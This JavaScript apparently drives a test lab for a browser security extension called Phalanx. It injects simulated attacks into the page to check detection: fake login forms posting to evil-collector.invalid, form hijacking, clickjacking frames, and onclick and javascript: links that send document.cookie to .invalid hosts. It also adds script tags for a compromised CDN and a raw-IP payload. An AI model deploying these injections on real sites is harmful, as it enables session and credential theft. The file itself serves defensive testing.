/* Phalanx Test Lab: each test injects one simulated attack and then checks whether
   the extension removed/neutralised it. Nothing executes and nothing leaves the PC. */
(function () {
  "use strict";
  const LV = (min) => ({ L: min >= 70, M: min >= 45, H: min >= 20 });
  const DOM = [
    ["Fake login form → foreign server", "Injects a password form that posts to evil-collector.invalid.", 92, () => {
      const f = document.createElement("form");
      f.action = "https://evil-collector.invalid/steal";
      f.innerHTML = '<input type="text" placeholder="email"><input type="password" placeholder="password"><button type="button">Sign in</button>';
      return box().appendChild(f);
    }],
    ["Form hijacking", "Re-points the page's real login form (above) to a foreign server.", 90, () => {
      const f = document.getElementById("staticForm");
      f.setAttribute("action", "https://evil-collector.invalid/harvest");
      return { check: () => f.style.display === "none" || !f.isConnected, el: f };
    }],
    ["Clickjacking (invisible frame)", "Lays an almost transparent full-screen frame over this page. Auto-removed after 6 s.", 85, () => {
      const fr = document.createElement("iframe");
      fr.src = "about:blank";
      fr.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;opacity:0.01;z-index:99999;border:0";
      document.body.appendChild(fr);
      setTimeout(() => fr.remove(), 6000);
      return fr;
    }],
    ["Fake login overlay", "Full-screen 'session expired' layer with a password box.", 80, () => {
      const d = document.createElement("div");
      d.style.cssText = "position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.6);display:grid;place-items:center";
      d.innerHTML = '<div style="background:#fff;color:#000;padding:20px;border-radius:8px">Session expired — sign in again<br><input type="password" placeholder="password"><br><button type="button" onclick="this.closest(\'div[style]\').parentNode.remove()">Close</button></div>';
      document.body.appendChild(d);
      setTimeout(() => d.remove(), 8000);
      return d;
    }],
    ["Script from known-malicious host", "Adds a <script> pointing at polyfill.io (compromised in 2024). Marked non-executable.", 95, () => script("https://cdn.polyfill.io/v3/polyfill.min.js")],
    ["Script from raw-IP host", "Adds a <script> from http://185.62.190.12 (non-executable).", 75, () => script("http://185.62.190.12/payload.js")],
    ["Malicious inline handler (XSS)", "Adds a button whose onclick reads document.cookie and sends it away.", 75, () => {
      const b = document.createElement("button");
      b.className = "btn sm";
      b.textContent = "Innocent button";
      b.setAttribute("onclick", "fetch('https://collector.invalid/?c='+document.cookie)");
      box().appendChild(b);
      return { check: () => !b.hasAttribute("onclick") || b.style.display === "none" || !b.isConnected, el: b };
    }],
    ["javascript: link with payload", "Adds a link that would run code instead of navigating.", 70, () => {
      const a = document.createElement("a");
      a.href = "javascript:fetch('https://x.invalid/?'+document.cookie)";
      a.textContent = "Claim your prize";
      box().appendChild(a);
      return { check: () => !a.hasAttribute("href") || a.style.display === "none" || !a.isConnected, el: a };
    }],
    ["Hidden frame to foreign site", "1×1 pixel frame loading ads-tracker.invalid (classic drive-by).", 55, () => {
      const fr = document.createElement("iframe");
      fr.src = "https://ads-tracker.invalid/";
      fr.width = 1; fr.height = 1; fr.style.border = "0";
      return box().appendChild(fr);
    }],
    ["New third-party script", "Script from an unknown vendor domain (common & usually harmless).", 30, () => script("https://cdn.unknown-vendor.invalid/tag.js")],
    ["Login form added after load", "A same-site login form rendered by JavaScript (normal for modern apps).", 30, () => {
      const f = document.createElement("form");
      f.innerHTML = '<input type="password" placeholder="password">';
      return box().appendChild(f);
    }],
    ["Full-screen pop-up overlay", "A big modal layer (cookie wall style). Auto-removed after 5 s.", 25, () => {
      const d = document.createElement("div");
      d.style.cssText = "position:fixed;inset:0;z-index:5000;background:rgba(0,0,0,.35)";
      document.body.appendChild(d);
      setTimeout(() => d.remove(), 5000);
      return d;
    }],
  ];
  const SITES = [
    ["Fake PayPal login (phishing)", "http://paypal-secure-login.verify-account.invalid/signin", 87],
    ["The Pirate Bay (piracy)", "https://thepiratebay.org/", 55],
    ["Raw IP address over HTTP", "http://10.13.37.1/", 45],
    ["Look-alike 'apple' (punycode)", "https://xn--pple-43d.invalid/", 45],
    ["Gmail (trusted — should NOT alert)", "https://mail.google.com/", 0],
  ];
  const DLS = [
    ["Disguised executable", "invoice.pdf.exe", 80],
    ["Cracked software", "photoshop_crack.zip", 40],
    ["Installer", "free_movie_player.msi", 30],
    ["Normal PDF (should NOT alert)", "report.pdf", 0],
  ];

  let holder;
  function box() {
    if (!holder) { holder = document.createElement("div"); holder.className = "card"; holder.style.display = "grid"; holder.style.gap = "8px"; document.querySelector("main").appendChild(holder); }
    return holder;
  }
  function script(src) {
    const s = document.createElement("script");
    s.type = "text/plain"; // never executed, never fetched
    s.setAttribute("src", src);
    return document.body.appendChild(s);
  }
  function badges(min) {
    const l = LV(min);
    return `<div class="lv">${["L", "M", "H"].map((k) => `<span class="${l[k] ? "y" : ""}">${k}</span>`).join("")}<span>score ${min}</span></div>`;
  }
  function card(title, desc, min) {
    const c = document.createElement("div");
    c.className = "card test";
    c.innerHTML = `<h4></h4><div class="dim" style="font-size:.88em"></div>${badges(min)}`;
    c.querySelector("h4").textContent = title;
    c.querySelector(".dim").textContent = desc;
    return c;
  }

  const domBox = document.getElementById("domTests");
  for (const [t, d, min, run] of DOM) {
    const c = card(t, d, min);
    const b = document.createElement("button"); b.className = "btn sm primary"; b.textContent = "Run test"; b.style.justifySelf = "start";
    const res = document.createElement("div"); res.className = "res";
    b.onclick = () => {
      res.className = "res"; res.textContent = "Watching…";
      const out = run();
      const el = out && out.el ? out.el : out;
      const check = out && out.check ? out.check : () => !el.isConnected || el.style.display === "none";
      setTimeout(() => {
        const caught = check();
        res.className = "res " + (caught ? "ok" : "no");
        res.textContent = caught ? "✓ Detected and neutralised by Phalanx" : "Not blocked here — either below your sensitivity, or reported only (see the alert / app).";
      }, 1800);
    };
    c.append(b, res);
    domBox.appendChild(c);
  }
  const siteBox = document.getElementById("siteTests");
  for (const [t, u, min] of SITES) {
    const c = card(t, u, min);
    const a = document.createElement("a"); a.className = "btn sm primary"; a.href = u; a.target = "_blank"; a.rel = "noopener"; a.textContent = "Open in new tab"; a.style.justifySelf = "start";
    c.append(a);
    siteBox.appendChild(c);
  }
  const dlBox = document.getElementById("dlTests");
  for (const [t, f, min] of DLS) {
    const c = card(t, f, min);
    const a = document.createElement("a"); a.className = "btn sm primary"; a.href = "/testlab/download/" + f; a.textContent = "Download " + f; a.style.justifySelf = "start";
    c.append(a);
    dlBox.appendChild(c);
  }
  // Is the extension present? The content script marks the page.
  setTimeout(() => {
    const ok = !!document.getElementById("phalanx-toast-host") || document.documentElement.dataset.phalanx === "on";
    const el = document.getElementById("extState");
    el.textContent = ok ? "extension active" : "extension not detected on this page";
    el.className = "chip plain " + (ok ? "st-resolved" : "st-pending");
  }, 1500);
})();
